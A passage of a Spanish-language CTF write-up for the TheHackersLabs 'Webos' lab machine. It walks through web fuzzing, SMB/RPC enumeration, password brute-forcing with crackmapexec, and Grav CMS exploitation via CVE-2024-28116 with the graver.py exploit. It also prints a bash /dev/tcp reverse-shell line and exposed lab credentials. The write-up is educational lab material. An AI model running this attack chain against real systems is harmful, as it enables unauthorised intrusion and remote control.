+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://192.168.100.113/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span> :: Extensions       : .php .txt .html 
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>login.txt               <span style="color:#f92672">[</span>Status: 200, Size: 13647, Words: 3159, Lines: 171, Duration: 156ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>login.html              <span style="color:#f92672">[</span>Status: 200, Size: 13647, Words: 3159, Lines: 171, Duration: 156ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>images                  <span style="color:#f92672">[</span>Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 581ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>login                   <span style="color:#f92672">[</span>Status: 200, Size: 13647, Words: 3159, Lines: 171, Duration: 924ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>home.html               <span style="color:#f92672">[</span>Status: 200, Size: 12283, Words: 2151, Lines: 159, Duration: 928ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>home.txt                <span style="color:#f92672">[</span>Status: 200, Size: 12283, Words: 2151, Lines: 159, Duration: 992ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>home                    <span style="color:#f92672">[</span>Status: 200, Size: 12283, Words: 2151, Lines: 159, Duration: 994ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user                    <span style="color:#f92672">[</span>Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 2438ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>assets                  <span style="color:#f92672">[</span>Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 881ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>admin                   <span style="color:#f92672">[</span>Status: 200, Size: 11127, Words: 3925, Lines: 128, Duration: 3372ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>admin.html              <span style="color:#f92672">[</span>Status: 200, Size: 11127, Words: 3925, Lines: 128, Duration: 3261ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>admin.txt               <span style="color:#f92672">[</span>Status: 200, Size: 11127, Words: 3925, Lines: 128, Duration: 3858ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>bin                     <span style="color:#f92672">[</span>Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 1305ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>system                  <span style="color:#f92672">[</span>Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 1017ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>cache                   <span style="color:#f92672">[</span>Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 428ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>vendor                  <span style="color:#f92672">[</span>Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 1111ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>backup                  <span style="color:#f92672">[</span>Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 532ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>robots.txt              <span style="color:#f92672">[</span>Status: 200, Size: 379, Words: 22, Lines: 22, Duration: 453ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>logs                    <span style="color:#f92672">[</span>Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 573ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>forgot_password         <span style="color:#f92672">[</span>Status: 200, Size: 11764, Words: 2040, Lines: 135, Duration: 877ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>forgot_password.html    <span style="color:#f92672">[</span>Status: 200, Size: 11764, Words: 2040, Lines: 135, Duration: 871ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>forgot_password.txt     <span style="color:#f92672">[</span>Status: 200, Size: 11764, Words: 2040, Lines: 135, Duration: 874ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>LICENSE.txt             <span style="color:#f92672">[</span>Status: 200, Size: 1071, Words: 154, Lines: 22, Duration: 533ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>tmp                     <span style="color:#f92672">[</span>Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 4640ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user_profile            <span style="color:#f92672">[</span>Status: 200, Size: 13654, Words: 3159, Lines: 171, Duration: 1830ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.php                    <span style="color:#f92672">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 757ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user_profile.txt        <span style="color:#f92672">[</span>Status: 403, Size: 0, Words: 1, Lines: 1, Duration: 1890ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.html                   <span style="color:#f92672">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 754ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.txt                    <span style="color:#f92672">[</span>Status: 200, Size: 12283, Words: 2151, Lines: 159, Duration: 787ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user_profile.html       <span style="color:#f92672">[</span>Status: 200, Size: 13654, Words: 3159, Lines: 171, Duration: 3326ms<span style="color:#f92672">]</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-e</em></td>
+					<td>Para indicar extensiones de archivos a buscar.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Obtuvimos bastantes archivos y directorios, pero por el tiempo que estaba tardando, decidí cancelarlo y analizar algunos de los resultados.</p>
+<p>Por ejemplo, ahí podemos ver un directorio llamado <strong>users</strong>, un directorio llamado <strong>backup</strong> (que no tiene nada) y un directorio llamado <strong>admin</strong>.</p>
+<p>Entremos al directorio <strong>users</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-webos/Captura3.png">
+</p>
+<p>Si entramos al directorio <strong>accounts</strong>, encontraremos un archivo llamado <strong>admin.yaml</strong> que, al descargarlo y leerlo, veremos lo siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat admin.yaml
+</span></span><span style="display:flex;"><span>state: enabled
+</span></span><span style="display:flex;"><span>email: admin@thehackerslabs.com
+</span></span><span style="display:flex;"><span>fullname: TheHackersLabs
+</span></span><span style="display:flex;"><span>title: Administrator
+</span></span><span style="display:flex;"><span>hashed_password: $2y$10$F0k5Ajn42KuhpoAN3Y7FXevY5W2MKHQpwpCKg7EzDxlayLD.iwVJC
+</span></span><span style="display:flex;"><span>language: es
+</span></span><span style="display:flex;"><span>content_editor: default
+</span></span><span style="display:flex;"><span>twofa_enabled: false
+</span></span><span style="display:flex;"><span>twofa_secret: NVNYOYB5IL3NPUKKRX4E6BPCTRWRQNFQ
+</span></span><span style="display:flex;"><span>avatar: <span style="color:#f92672">{</span>  <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>access:
+</span></span><span style="display:flex;"><span>  site:
+</span></span><span style="display:flex;"><span>    login: true
+</span></span><span style="display:flex;"><span>  admin:
+</span></span><span style="display:flex;"><span>    login: true
+</span></span><span style="display:flex;"><span>    super: true
+</span></span></code></pre></div><p>Es un hash que no podremos identificar ni crackear, por lo que no nos sirve mucho.</p>
+<p>Por último, igual podemos ver el directorio <strong>admin</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-webos/Captura4.png">
+</p>
+<p>Tenemos otro login, pero no tenemos credenciales de acceso.</p>
+<p>De ahí en fuera, no encontraremos algo más. Entonces, vamos a analizar el <strong>servicio Samba</strong>.</p>
+<h3 id="SambaRPC">Análisis del Servicio Samba y Enumeración de Servicio RPC</h3>
+<p>Veamos qué nos dice <strong>crakmapexec</strong> sobre el <strong>servicio Samba</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.100.10
+</span></span><span style="display:flex;"><span>SMB         192.168.100.10 <span style="color:#ae81ff">445</span>    THEHACKERSLABS-WEBOS <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 6.1 <span style="color:#f92672">(</span>name:THEHACKERSLABS-WEBOS<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:THEHACKERSLABS-WEBOS<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Bien, podríamos intentar loguearnos usando el <strong>usuario guest</strong>, pero no podremos.</p>
+<p>Aunque con <strong>smbmap</strong> nos mostrará algunos recursos compartidos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.100.10 -u <span style="color:#e6db74">&#39;guest&#39;</span> --no-banner
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">0</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                          
+</span></span><span style="display:flex;"><span>                                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 192.168.100.10:445	Name: webos.thl           	Status: NULL Session
+</span></span><span style="display:flex;"><span>	Disk                                                  	Permissions	Comment
+</span></span><span style="display:flex;"><span>	----                                                  	-----------	-------
+</span></span><span style="display:flex;"><span>	print$                                            	NO ACCESS	Printer Drivers
+</span></span><span style="display:flex;"><span>	webos                                             	NO ACCESS	Archivo compartido en Samba
+</span></span><span style="display:flex;"><span>	IPC$                                              	NO ACCESS	IPC Service <span style="color:#f92672">(</span>Samba 4.17.12-Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>	nobody                                            	NO ACCESS	Home Directories
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>Sí te das cuenta, no podremos ver el contenido de los archivos compartidos, pero podemos ver 2 directorios que son <strong>webos</strong> y <strong>nobody</strong>, posiblemente contengan algo que nos ayude.</p>
+<p>Lo que necesitamos es un usuario y contraseña.</p>
+<p>Como vimos en el escaneo que el <strong>servicio RCP</strong> está activo, podríamos tratar de entrar y enumerarlo.</p>
+<p>Usemos una sesión nula primero:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rpcclient -U <span style="color:#e6db74">&#39;&#39;</span> -N 192.168.100.10
+</span></span><span style="display:flex;"><span>rpcclient $&gt;
+</span></span></code></pre></div><p>Muy bien, funcionó.</p>
+<p>Veamos qué usuarios existen:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rpcclient $&gt; enumdomusers
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>webos<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x3e8<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>rpcclient $&gt;
+</span></span></code></pre></div><p>Solamente existe un usuario.</p>
+<p>No encontraremos algo más en este servicio más que ese usuario.</p>
+<p>Usémoslo para aplicar fuerza bruta con <strong>crackmapexec</strong>.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="FuerzaBrutaEnumSamba">Aplicando Fuerza Bruta y Enumeración del Servicio Samba</h3>
+<p>Usaremos un filtro para que nos muestre solo un resultado válido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.100.10 -u <span style="color:#e6db74">&#39;webos&#39;</span> -p /usr/share/wordlists/rockyou.txt | grep <span style="color:#e6db74">&#39;[+]&#39;</span>
+</span></span><span style="display:flex;"><span>SMB              192.168.100.10 <span style="color:#ae81ff">445</span>    THEHACKERSLABS-WEBOS <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> THEHACKERSLABS-WEBOS<span style="color:#ae81ff">\w</span>ebos:geraldine
+</span></span></code></pre></div><p>Tenemos la contraseña.</p>
+<p>Ahora sí podemos enumerar los archivos compartidos con <strong>smbmap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.100.10 -u <span style="color:#e6db74">&#39;webos&#39;</span> -p <span style="color:#e6db74">&#39;geraldine&#39;</span> --no-banner
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                      
+</span></span><span style="display:flex;"><span>                                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 192.168.100.10:445	Name: webos.thl           	Status: NULL Session
+</span></span><span style="display:flex;"><span>	Disk                                                  	Permissions	Comment
+</span></span><span style="display:flex;"><span>	----                                                  	-----------	-------
+</span></span><span style="display:flex;"><span>	print$                                            	READ ONLY	Printer Drivers
+</span></span><span style="display:flex;"><span>	webos                                             	READ ONLY	Archivo compartido en Samba
+</span></span><span style="display:flex;"><span>	IPC$                                              	NO ACCESS	IPC Service <span style="color:#f92672">(</span>Samba 4.17.12-Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>Nuestro usuario puede ver dos directorios, pero el que nos interesa es el directorio <strong>webos</strong>.</p>
+<p>Veamos qué hay dentro de ese directorio:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.100.10 -u <span style="color:#e6db74">&#39;webos&#39;</span> -p <span style="color:#e6db74">&#39;geraldine&#39;</span> -r webos --no-banner
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                          
+</span></span><span style="display:flex;"><span>                                                                                                                             
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 192.168.100.10:445	Name: webos.thl           	Status: NULL Session
+</span></span><span style="display:flex;"><span>	Disk                                                  	Permissions	Comment
+</span></span><span style="display:flex;"><span>	----                                                  	-----------	-------
+</span></span><span style="display:flex;"><span>	print$                                            	READ ONLY	Printer Drivers
+</span></span><span style="display:flex;"><span>	webos                                             	READ ONLY	Archivo compartido en Samba
+</span></span><span style="display:flex;"><span>	./webos
+</span></span><span style="display:flex;"><span>	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Jul <span style="color:#ae81ff">17</span> 12:47:07 2024	.
+</span></span><span style="display:flex;"><span>	dr--r--r--                <span style="color:#ae81ff">0</span> Thu Jul <span style="color:#ae81ff">18</span> 03:31:55 2024	..
+</span></span><span style="display:flex;"><span>	fr--r--r--              <span style="color:#ae81ff">245</span> Wed Jul <span style="color:#ae81ff">17</span> 12:47:07 2024	MamaÑema.txt
+</span></span><span style="display:flex;"><span>	IPC$                                              	NO ACCESS	IPC Service <span style="color:#f92672">(</span>Samba 4.17.12-Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>Hay un archivo de texto.</p>
+<p>Descarguémoslo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbmap -H 192.168.100.10 -u <span style="color:#e6db74">&#39;webos&#39;</span> -p <span style="color:#e6db74">&#39;geraldine&#39;</span> --download webos/MamaÑema.txt --no-banner
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting download: webos<span style="color:#ae81ff">\M</span>amaÑema.txt <span style="color:#f92672">(</span><span style="color:#ae81ff">245</span> bytes<span style="color:#f92672">)</span>                                                                    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File output to: /../TheHackersLabs/Webos/content/192.168.100.10-webos_MamaÑema.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections
+</span></span></code></pre></div><p>Y leámoslo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat MamaÑema.txt
+</span></span><span style="display:flex;"><span>++++++++++<span style="color:#f92672">[</span>&gt;++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;+++++++++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++&gt;++++++&gt;++++<span style="color:#f92672">&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span>-<span style="color:#f92672">]</span>&gt;---.&gt;.&gt;-.&gt;-----.&gt;.&gt;--.&gt;.&gt;+.&gt;++++.&gt;-----.&gt;-.&gt;+.&gt;++++.&gt;---.&gt;++.....
+</span></span></code></pre></div><p>Parece ser un mensaje codificado en <strong>brainfuck</strong>.</p>
+<h3 id="brainfuck">Decodificación de Mensaje Codificado en Brainfuck y Ganando Acceso a Login de CMS Grav</h3>
+<p>Podemos decodificar el mensaje con la siguiente página:</p>
+<ul>
+<li><a href="https://md5decrypt.net/en/Brainfuck-translator/" target="_blank">Branfuck Translator</a></li>
+</ul>
+<p>Y obtenemos el siguiente mensaje:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-webos/Captura5.png">
+</p>
+<p>Obtuvimos un usuario y contraseña, aunque esa contraseña parece que está incompleta.</p>
+<p>Pero si la utilizamos en el primer login, funciona y nos deja entrar:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-webos/Captura6.png">
+</p>
+<p>Nos pide otra vez credenciales de acceso y si usamos las mismas, igual funciona y nos deja entrar:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-webos/Captura7.png">
+</p>
+<p>El problema es que no hay nada aquí, por lo que llegamos a un callejón sin salida.</p>
+<p>Pero si regresamos al login que vimos en el directorio <strong>admin</strong> y le damos las mismas credenciales, lograremos ganar acceso:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-webos/Captura8.png">
+</p>
+<p>Genial, ganamos acceso al <strong>CMS Grav</strong> y ahí mismo podemos ver que es la versión <strong>1.7.44</strong>.</p>
+<h3 id="CVE">Abusando de Version Vulnerable del CMS Grav</h3>
+<p>Si buscamos un Exploit para la <strong>versión 1.7.44 del CMS Grav</strong>, encontraremos una vulnerabilidad que permite la <strong>ejecución remota de comandos (RCE)</strong> asignándole el <strong>CVE-2024-28116</strong>.</p>
+<p>Resulta que es posible crear una platilla que sirve para ejecutar la vulnerabilidad <strong>Server Side Template Injection (SSTI)</strong> y también una <strong>ejecución remota de comandos (RCE)</strong>.</p>
+<p>Tenemos unos cuantos Exploits de <strong>GitHub</strong> que podemos usar para explotar esta vulnerabilidad.</p>
+<p>Vamos a probarlos.</p>
+<h4 id="Exploit1">Probando Exploit: Graver.py - Explotando un SSTI + RCE</h4>
+<p>Este script crea una página maliciosa que contiene código que ejecuta comandos dentro del <strong>CMS Grav</strong>, justo como un <strong>SSTI + RCE</strong>.</p>
+<p>Aquí puedes encontrar el Exploit:</p>
+<ul>
+<li><a href="https://github.com/akabe1/Graver" target="_blank">Repositorio de akabe1: Graver</a></li>
+</ul>
+<p>Descárgalo con <strong>wget</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/akabe1/Graver/refs/heads/main/graver.py
+</span></span></code></pre></div><p>El script necesita que lo modifiquemos para agregarle el usuario y contraseña.</p>
+<p>Solamente entra y abajo de las librerías verás dónde agregar las credenciales:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">##############################################</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enter here your Grav CMS editor credentials</span>
+</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#34;</span>
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Perico69*****&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##############################################</span>
+</span></span></code></pre></div><p>Debe quedar así.</p>
+<p>Ahora ejecuta el Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 graver.py -t http://192.168.100.10 -p <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>RCE payload injected, now visit the malicious page at: <span style="color:#e6db74">&#39;http://192.168.100.10:80/hacked_RY6V?do=&#39;</span>
+</span></span></code></pre></div><p>Parece que funcionó.</p>
+<p>Comprobémoslo en la sección de páginas del dashboard del <strong>CMS Grav</strong> (recarga la página si es necesario):</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-webos/Captura9.png">
+</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-webos/Captura10.png">
+</p>
+<p>Ahí está.</p>
+<p>Si visitamos la página, veremos que se ejecuta el comando que viene escrito en el código de la página web, siendo el comando <strong>whoami</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-webos/Captura11.png">
+</p>
+<p>Pero, se supone que esta página debería servir como una <strong>WebShell</strong>, cosa que no hace.</p>
+<p>Si cambiamos el comando a cualquier otro, ese comando se ejecutará. Probemos con el comando <strong>id</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-webos/Captura12.png">
+</p>
+<p>Y si recargamos la página, el comando se ejecuta:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-webos/Captura13.png">
+</p>
+<p>Entonces, podemos modificarlo para agregar una <strong>Reverse Shell</strong>.</p>
+<p>Abre un listener con <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Modifica el comando para agregar la <strong>Reverse Shell</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/Tu_IP/443 0&gt;&amp;1&#34;&#39;</span>
+</span></span></code></pre></div><p align="center">
+<img src="/assets/images/THL-writeup-webos/Captura14.png">
+</p>
+<p>Una vez que guardes los cambios, vuelve a la página, recárgala y observa la <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.100.10<span style="color:#f92672">]</span> <span style="color:#ae81ff">47350</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>509<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>www-data@TheHackersLabs-Webos:/var/www/html$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>www-data
+</span></span></code></pre></div><p>Estamos dentro.</p>
+<p>Ya solo falta obtener una sesión interactiva:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Paso 1:</span>
+</span></span><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Paso 2:</span>
+</span></span><span style="display:flex;"><span>CTRL + Z
+</span></span><span style="display:flex;"><span>
